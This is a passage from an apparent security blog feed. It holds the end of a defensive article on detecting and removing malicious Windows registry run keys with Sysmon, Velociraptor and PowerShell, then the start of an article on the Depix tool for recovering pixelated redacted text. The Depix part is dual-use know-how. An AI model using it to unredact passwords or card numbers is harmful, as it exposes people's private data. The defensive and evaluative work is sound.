&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;write-host&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;----Reg location is &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;----&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ForegroundColor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Magenta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;get-itemproperty&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;fl
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-22.png&#34; alt=&#34;2021 07 28 09 22&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;And if we look hard enough, &lt;strong&gt;we identify something abnormal&lt;/strong&gt;. Once we take the executable and reverse engineer it, we can determine it is a malicious executable from the adversary. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_17-42-1024x315.png&#34; alt=&#34;2021 07 28 17 42&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If you identify a malicious run key, you are of course obliged to remove it from the machine. Let’s discuss how in a moment, &lt;strong&gt;after we discuss what this evil looks like from a SIEM / SOC perspective.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Monitoring for Evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;monitoring-for-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#monitoring-for-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Let’s discuss what this looks like from a detection and monitoring perspective.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;For our example, we are using the built-in &lt;strong&gt;Windows Event Viewer&lt;/strong&gt;, and then adding &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#:~:text=System%20Monitor%20%5c%28Sysmon%5c%29%20is%20a,changes%20to%20file%20creation%20time.&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Sysmon&lt;/strong&gt;&lt;/a&gt; and &lt;a href=&#34;https://github.com/Neo23x0/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Florian&lt;/strong&gt; &lt;strong&gt;Roth’s&lt;/strong&gt;&lt;/a&gt; config of rules for detection. You could then feed this sysmon log data into a SIEM, and monitor hundreds of thousands of endpoints for run key malice (and other stuff too).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_18-15.png&#34; alt=&#34;2021 07 28 18 15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;There is a wealth of information here worth considering: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;BLUE&lt;/strong&gt; arrows: event info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;Event ID 13 involves registry values&lt;/strong&gt; &lt;strong&gt;modification&lt;/strong&gt;, and this ID will be consistent in any environment. &lt;/li&gt;
&lt;li&gt;The &lt;strong&gt;EventType&lt;/strong&gt; and &lt;strong&gt;Task Category&lt;/strong&gt; spell out exactly what is happening here too: &lt;strong&gt;a registry value is being set&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;RED&lt;/strong&gt; arrows**:** specific info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;TargetObject&lt;/strong&gt; shows the &lt;strong&gt;full path&lt;/strong&gt; for the run key registry we are changing. It also shows the &lt;strong&gt;name&lt;/strong&gt; we called it, and includes the special character that modifies the behaviour&lt;/li&gt;
&lt;li&gt;The &lt;strong&gt;Details&lt;/strong&gt; section shows the command / executable the run key is forced to run&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;PINK&lt;/strong&gt; arrow: MITRE ATT&amp;amp;CK reference&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This may not be in every sysmon config. However &lt;strong&gt;Florian Roth&lt;/strong&gt; includes the MITRE ATT&amp;amp;CK tactic number in a particular event.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Rather than get attack alerts for every Event 13, I’d recommend you go on a bit of a discovery exercise of what the run keys in your environment normally do.&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;Across the entire enterprise do they have the same consistent contents? &lt;/p&gt;
&lt;p&gt;Or does the finance department run software that legitimately alters the run key? &lt;/p&gt;
&lt;p&gt;Would you be able to baseline this and then create a small alert for any new, inconsistent run key changes to a workstation in the finance department?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This has greater value than hoping to catch one rogue Event 13 out of a million.&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3&gt;Interactive detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;interactive-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#interactive-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;If you want a more interactive detection experience, might I recommend a tool like &lt;a href=&#34;https://docs.velociraptor.app/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Dr Michael Cohen’s Velociraptor?&lt;/strong&gt;&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Velocitaptor is a tool (and philosophy) that deserves its own article, so I will be brief here. Velociraptor is an endpoint response agent that you can install on every single endpoint across your enterprise, and orchestrate from one server via a web-app. This distributed tool allows us to then query thousands of machines at once. &lt;/p&gt;
&lt;p&gt;Built in to Velociraptor is a hunt that queries every Windows machine specifically for their startup process, and part of this hunt includes &lt;a href=&#34;https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Sys/StartupItems.yaml&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;querying run keys&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt;  As you can see, this hunt targets a number of the registry run keys that our previous PowerShell query also hunted for. Velociraptor targets an additional few run keys, as well as some other startup locations (but I leave that to you to investigate this all further).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-02_10-30-1024x519.png&#34; alt=&#34;2021 08 02 10 30&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If we fire off this startup detection hunt, we will be given a beautifully formatted table of results. In real production environments, you will find more noise than this so be warned! But look at what we detected - a single machine in our domain currently running &lt;strong&gt;C:\evil.exe&lt;/strong&gt;, shocking stuff. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-02_10-18-1024x665.png&#34; alt=&#34;2021 08 02 10 18&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Fortunately now we know and can eradicate it from the host - I’ll show you how.&lt;/strong&gt; &lt;/p&gt;
&lt;h2&gt;Eradicating Run Key Evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;eradicating-run-key-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#eradicating-run-key-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;It’s time. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/showtime.png&#34; alt=&#34;showtime&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Be surgical here.&lt;/strong&gt; If you aren’t precise in your commands, you will &lt;strong&gt;accidentally remove&lt;/strong&gt; run key entries that are &lt;strong&gt;legitimate&lt;/strong&gt;.  It&amp;rsquo;s important you remove with &lt;strong&gt;-verbose&lt;/strong&gt; too and double-check it has gone, to make sure you have removed what you think you have. &lt;/p&gt;
&lt;p&gt;Off the back of our PowerShell for loop, copy and paste the &lt;strong&gt;full path&lt;/strong&gt; location that the evil was detected. And double check this is where the malicious run key resides.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_19-07-1024x276.png&#34; alt=&#34;2021 07 28 19 07&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Then pick the EXACT name of the run key entry you want to remove. Copy paste it, include any special characters too please. &lt;strong&gt;Don’t copy&lt;/strong&gt; the executable details that come &lt;strong&gt;after the colon&lt;/strong&gt; ( : )&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Remove-ItemProperty&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*Run Safe Mode too&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_19-11-1024x202.png&#34; alt=&#34;2021 07 28 19 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We get our verbose message returned to us confirming that we are indeed removing the run key we think we are.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_19-12-1024x127.png&#34; alt=&#34;2021 07 28 19 12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Then check again to be sure it&amp;rsquo;s gone. If you still have the malicious run key here, double check you have copied and pasted appropriately, as fat-fingering paths and registry names are very real problems.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/empty-1024x124.png&#34; alt=&#34;empty&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Unpicking Run Keys&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Run keys are obscure mechanisms of persistence for sure. But I hope this article has instilled confidence in how straightforward it is to monitor, detect, control, and remove any malicious activity involving your run keys.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a defender, sometimes our roles are framed as being consistently at a disadvantage compared to the adversary. They can leverage zero-days, they can trick users, they can run across time zones with bigger budgets. &lt;strong&gt;Whilst we must consistently be at the top of our game, they only need to be lucky once.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;All of this is true, but I find that sometimes we could invert this framing to focus on the advantages we possess compared to the attacker.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is &lt;strong&gt;OUR&lt;/strong&gt; environment. This is &lt;strong&gt;OUR&lt;/strong&gt; registry. And these are &lt;strong&gt;OUR&lt;/strong&gt; run keys. We know how it all works, and we should be here waiting for the adversary to so much as sneeze in our domain without us knowing about it. Sure, have a foothold. But we aren’t naive, we expect compromise. And we will catch you, kick you out, and ensure your future attempts at re-entry are that bit harder. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/sparta-1024x577.jpg&#34; alt=&#34;sparta&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Understand what is normal for your environment so you know when a registry run key manipulation is out of place, and foster a hostile network so an adversary can’t move an inch without you knowing about it and containing them.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There’s a lot to do and never enough time or resource to do it, but that’s why we’re in infosec right? &lt;/p&gt;
&lt;h2&gt;Some Bedside Reading&lt;span class=&#34;absolute -mt-20&#34; id=&#34;some-bedside-reading&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#some-bedside-reading&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are so many other janky registry entries that can do weird things with run keys. We didn’t mention, for example, how entire folders can become mechanisms of persistence via registry run keys! You can read more &lt;a href=&#34;https://www.picussecurity.com/resource/blog/picus-10-critical-mitre-attck-techniques-t1060-registry-run-keys-startup-folder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;, &lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;, and &lt;a href=&#34;https://attack.mitre.org/techniques/T1547/001/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you enjoyed this article or especially if you DIDN’T enjoy this article, give these other ones a go: looking at &lt;a href=&#34;https://labs.jumpsec.com/car-hacking-manual-bypass-of-modern-rolling-code-implementations/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;hacking cars&lt;/strong&gt;&lt;/a&gt; and breaking their keyfob encryption; evaluating the potential &lt;a href=&#34;https://labs.jumpsec.com/can-depix-deobfuscate-your-data/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;de-obfuscate redacted text&lt;/strong&gt;&lt;/a&gt; in sensitive documents; and advanced techniques to defend your &lt;a href=&#34;https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;C2&amp;rsquo;s&lt;/strong&gt;&lt;/a&gt; honour.&lt;/p&gt;
&lt;p&gt;Any questions, comments, or criticisms please drop me a line&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt; &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dray Agha,&lt;/strong&gt; Security Researcher&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-10_21-10.png&#34; alt=&#34;2021 08 10 21 10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Can Depix deobfuscate your data?</title>
      <link>//localhost:1313/articles/2021/08/2021-08-03-can-depix-deobfuscate-your-data/</link>
      <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/08/2021-08-03-can-depix-deobfuscate-your-data/</guid>
      <description>
        
        
        &lt;h2&gt;&lt;strong&gt;&lt;em&gt;The censored text cracking tool&lt;/em&gt;&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-censored-text-cracking-tool&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-censored-text-cracking-tool&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;By Caleb Herbert&lt;/p&gt;
&lt;p&gt;In this post, Caleb explores &lt;strong&gt;Depix&lt;/strong&gt; and its potential to recover sensitive text from reports that were redacted by the original authors. You can use our guidance to enter the challenge and test your GPU’s mettle against the gauntlet we’ve thrown down!&lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;1. What is Depix and how is it used?&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;When sensitive information is about to be displayed to a reader, an author may &lt;strong&gt;blur the sensitive text&lt;/strong&gt; so it can no longer be recognised. &lt;strong&gt;Blurring&lt;/strong&gt; is intended to be used to redact text &lt;strong&gt;FOREVER&lt;/strong&gt;… but I think that isn’t true anymore. We have some tooling that can unblur that text, and uncover quite interesting things that the original authors would have rather we didn&amp;rsquo;t know.&lt;/p&gt;
&lt;p&gt;This &lt;a href=&#34;https://twitter.com/nieldk/status/1416659174759469057?s=20&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fascinating Twitter exchange&lt;/a&gt; offers the perfect example of how the &lt;strong&gt;Depix&lt;/strong&gt; tool could be deployed to steal redacted, sensitive credit card information?!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;images/2021-07-30_10-13.png&#34; alt=&#34;2021 07 30 10 13&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;images/2021-07-30_15-55-1.png&#34; alt=&#34;2021 07 30 15 55 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;2.What is Depix and what can it do?&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/beurtschipper/Depix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Depix is a Python program&lt;/a&gt; designed to recover censored text to a readable format via a simple command. &lt;em&gt;Sounds too good to be true right?&lt;/em&gt; In this post, we’ll be evaluating how effective Depix is at defeating obfuscation.&lt;/p&gt;
&lt;p&gt;The Depix tool assumes that all text positioning of all characters is done at pixel level. Pixelation is an author’s attempt to redact and obfuscate specific chunks of text they consider to be sensitive. For example, a test report may pixelate and blur a user’s password that the tester had been able to recover. As a high-level overview, leveraging pixelation-as-redaction lowers the resolution and quality of an image to undermine its readability.&lt;/p&gt;
&lt;p&gt;A big caveat to Depix’s use-case is that it &lt;strong&gt;relies on the redaction tool operating in a specific way&lt;/strong&gt;: the text must have been pixelated with a linear box filter, since it processes every block separately. What this means is that the tool takes a quadrant of the pixels and overwrites them based on specific averages of those collected pixels. If you have obfuscated your sensitive text by using a &lt;strong&gt;nice thick, opaque box&lt;/strong&gt; then you don’t have anything to worry about….but if you used pixelation as obfuscation, then &lt;strong&gt;you may have 99 problems and de-obfuscation is one&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_10-24-edited.png&#34; alt=&#34;2021 07 28 10 24&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;2.1 Reversing pixelation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;21-reversing-pixelation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#21-reversing-pixelation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Given that the &lt;em&gt;algorithm&lt;/em&gt; that Depix un-pixelates the text follows a specific ‘recipe’, it may not always be effective.&lt;/p&gt;
&lt;p&gt;Depix deploys almost a &lt;strong&gt;brute force&lt;/strong&gt; method to recover the original text. It takes all printable characters and then begins to pixelate these characters in different combinations. This brute force is compared with the original, blurred text and continues until the same pixelated, numeric value can be replicated.&lt;/p&gt;
&lt;h2&gt;2.2 Why is there a concern? &lt;span class=&#34;absolute -mt-20&#34; id=&#34;22-why-is-there-a-concern&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#22-why-is-there-a-concern&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Depix &lt;strong&gt;&lt;em&gt;could&lt;/em&gt;&lt;/strong&gt; have a serious impact on the existing archive of documents and videos that exist across the internet.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-27_17-40.png&#34; alt=&#34;2021 07 27 17 40&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The possibility of this tool means any files which have been redacted and publicly disclosed, or YouTube videos which have passwords/texts or IPs redacted can be recovered and stolen. If malicious actors, organisation competitors, or even script kiddies got their hands on this, the censored private information would be at serious risk. &lt;/p&gt;
&lt;p&gt;They would only need to screenshot/download the files or images and run Depix against it. Granted, they’d have to have used a specific set of tools to censor the text but if so, the risk remains. &lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;3. Depix in action&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;We’ve teased you enough, let’s see this tool in action!&lt;/p&gt;
&lt;p&gt;We’re going to do this twice. The &lt;strong&gt;first time&lt;/strong&gt; we’ll be using the author’s practice example, to ensure the tooling works as expected. The &lt;strong&gt;second time&lt;/strong&gt; we’ll conjure up our own redacted, pixelated image and see how well the tooling still recovers the original text. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.1 Setup Depix&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;31-setup-depix&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#31-setup-depix&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Go to the &lt;a href=&#34;https://github.com/beurtschipper/Depix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github repo for Depix&lt;/a&gt;, and download the .ZIP that contains all of the tooling. Extract the .ZIP in a directory you are happy with.&lt;/p&gt;
&lt;p&gt;You’ll want to traverse to two directories down (/Depix-main/Depix-main) and then install the requirements that Depix requires to work&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pngbase646f4446a5516dec7d.png&#34; alt=&#34;pngbase646f4446a5516dec7d&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;3.2 Test images&lt;span class=&#34;absolute -mt-20&#34; id=&#34;32-test-images&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#32-test-images&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are two important directories we’ll need for this experiment: /&lt;strong&gt;testimages/&lt;/strong&gt; and /&lt;strong&gt;searchimages&lt;/strong&gt;/ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The test image directory includes censored text which you can practice recovering. &lt;/li&gt;
